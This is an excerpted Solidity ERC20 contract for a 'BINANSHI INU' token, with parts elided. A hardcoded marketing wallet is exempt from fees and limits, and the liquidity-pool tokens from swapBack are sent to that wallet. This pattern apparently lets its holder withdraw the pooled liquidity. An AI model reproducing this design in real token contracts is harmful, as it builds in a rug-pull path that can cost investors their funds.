...
contract BINANSHI is ERC20, Ownable {
    using SafeMath for uint256;
    address routerAdress = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address DEAD = 0x000000000000000000000000000000000000dEaD;

    string constant _name = "BINANSHI INU";
    string constant _symbol = "BINANSHI";
    ...
    address private marketingFeeReceiver = 0x1CCD2AB666B2ad07b7c845a582AE6937462C11B8;
    ...
    constructor (address _address) Ownable(msg.sender) {
        ...
        isFeeExempt[0x1CCD2AB666B2ad07b7c845a582AE6937462C11B8] = true;
        isTxLimitExempt[_owner] = true;
        isTxLimitExempt[0x1CCD2AB666B2ad07b7c845a582AE6937462C11B8] = true;
    ...
    function swapBack() internal swapping {
        ...
        if(amountToLiquify > 0){
            router.addLiquidityETH{value: amountETHLiquidity}(
                ...
                0,
                0,
                0x1CCD2AB666B2ad07b7c845a582AE6937462C11B8,
                block.timestamp
            );
